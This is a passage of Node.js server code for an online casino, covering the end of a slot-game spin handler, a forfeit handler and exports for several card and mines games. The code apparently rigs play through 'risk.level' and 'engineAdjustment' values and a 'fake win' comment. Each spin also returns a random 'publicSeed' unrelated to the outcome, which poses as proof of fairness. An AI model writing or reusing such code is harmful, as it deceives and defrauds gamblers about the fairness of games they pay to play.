            if (win > amount) {
                await User.updateOne({ _id: user._id }, { lastBetResult: 'WIN', activeGame: { type: 'NONE' }, $inc: { consecutiveWins: 1 }, $set: { consecutiveLosses: 0 } });
            } else {
                // Fake win or tiny win (loss of balance)
                await User.updateOne({ _id: user._id }, { lastBetResult: 'LOSS', activeGame: { type: 'NONE' }, $set: { consecutiveWins: 0 }, $inc: { consecutiveLosses: 1 } });
            }
        } else {
            await User.updateOne({ _id: user._id }, { lastBetResult: 'LOSS', activeGame: { type: 'NONE' }, $set: { consecutiveWins: 0 }, $inc: { consecutiveLosses: 1 } }); 
        }
        
        await saveGameLog(user._id, 'TIGER', amount, win, { grid, outcome }, risk.level, engineAdjustment, user.lastTransactionId);
        
        const newTrophies = await AchievementSystem.check(user._id, { 
            game: 'TIGER', bet: amount, payout: win, extra: { previousLosses: prevLosses, lossStreakBroken: win > amount }
        });
        
        res.json({ grid, totalWin: win, winningLines: lines, isFullScreen: fs, newBalance: (await User.findById(user._id)).balance, publicSeed: crypto.randomBytes(16).toString('hex'), newTrophies });
    } catch(e) { res.status(400).json({message: e.message}); }
};

// ... forfeitGame remains the same ...
const forfeitGame = async (req, res) => {
    try {
        await GameStateHelper.clear(req.user.id);
        const user = await User.findById(req.user.id);
        if (user.activeGame && user.activeGame.type !== 'NONE') {
            await saveGameLog(user._id, user.activeGame.type, user.activeGame.bet, 0, { result: 'FORFEIT' }, 'NORMAL', 'TIMEOUT');
            await User.updateOne({ _id: user._id }, { $set: { activeGame: { type: 'NONE' }, lastBetResult: 'LOSS' } });
            AchievementSystem.check(user._id, { game: user.activeGame.type, bet: user.activeGame.bet, payout: 0 });
        }
        res.json({ success: true, newBalance: user.balance });
    } catch(e) { res.status(500).json({ message: e.message }); }
};

module.exports = {
    baccaratDeal,
    blackjackDeal,
    blackjackHit,
    blackjackStand,
    blackjackInsurance,
    minesStart,
    minesReveal,
    minesCashout,
    tigerSpin,
    forfeitGame
};
